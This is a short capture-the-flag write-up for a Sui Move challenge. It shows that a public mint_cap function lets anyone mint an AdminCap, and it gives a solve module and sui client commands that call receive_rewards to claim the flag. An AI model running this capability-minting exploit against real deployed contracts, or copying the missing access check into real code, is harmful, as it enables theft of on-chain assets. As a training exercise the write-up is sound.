# Game

In this challenge our goal is to call `receive_rewards`:

```rust
public entry fun receive_rewards(_: &AdminCap, player: Player, ctx: &mut TxContext) {
    let owner = player.owner;

    event::emit(FlagEvent {
        owner: owner,
        flag: true,
    });

    transfer::transfer(player, owner)

}
```

We need a valid `AdminCap` and `Player`, although `AdminCap` is not checked. The challenge is quite easy as we have these functions:

```rust
public fun mint_cap(ctx: &mut TxContext): AdminCap {
    AdminCap {
        id: object::new(ctx),
    }
}

public entry fun transfer_cap(sender: &PackageSender, admin: address, ctx: &mut TxContext) {
    assert!( ctx.sender() == sender.sender, EINVALID_ADMIN);
    let adminCap = mint_cap(ctx);
    transfer::transfer(adminCap, admin);
}
```

We can essentially mint a cap and transfer it to ourself. Then we create a `Player` and claim rewards.

```rust
module solve_game::solve{
    use game::challenge::{mint_cap};
    use sui::transfer::public_transfer;

    #[allow(lint(share_owned))]
    public entry fun create(ctx: &mut TxContext) {
        let admincap = mint_cap(ctx);
        public_transfer(admincap, ctx.sender());
    }
}
```

We write a simple solve contract to create and public transfer the object to be used in Client CLI.

```bash
# admincap: 0x24fef3b6ab93173fed76abe82a1cefa24b242fe63912cc124f4f373de6a84453
# player: 0x5bd9d1de47bca34fb6f7fd333395a45b7ac61fa785ea4e9e2bd4642d68b5e735

sui client call --package 0xe796e6aff74e8bebb6e7bb61f9addfe524a2852d0f5da828d59a05f465bfc7ca  --module solve --function create --gas-budget 100000000
sui client call --package 0x2e5ba180f53d8aa73de26e03435abe6ac8f182a383ce8a99f4aaca8a76fc7979 --module challenge --function create_player --gas-budget 100000000
sui client call --package 0x2e5ba180f53d8aa73de26e03435abe6ac8f182a383ce8a99f4aaca8a76fc7979 --module challenge --function receive_rewards --args 0x24fef3b6ab93173fed76abe82a1cefa24b242fe63912cc124f4f373de6a84453 0x5bd9d1de47bca34fb6f7fd333395a45b7ac61fa785ea4e9e2bd4642d68b5e735  --gas-budget 100000000
```